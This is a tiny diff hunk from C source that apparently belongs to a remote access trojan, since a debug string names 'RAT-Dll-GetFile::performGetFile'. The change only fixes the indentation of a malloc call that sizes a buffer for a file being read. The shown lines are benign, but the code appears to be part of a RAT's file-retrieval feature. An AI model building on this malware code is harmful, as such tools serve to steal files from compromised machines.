@@ -126,7 +126,7 @@ INT performGetFile(__in const char* filePath, __out char** fileBytes, __out DWOR
 	}
 
 	// Allocate for our file buffer
-	 fileContents = (char*)malloc(fileSize.QuadPart * sizeof(char));
+	fileContents = (char*)malloc(fileSize.QuadPart * sizeof(char));
 	if (fileContents == NULL)
 	{
 		OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Failure from malloc (NOT ENOUGH MEMORY)");
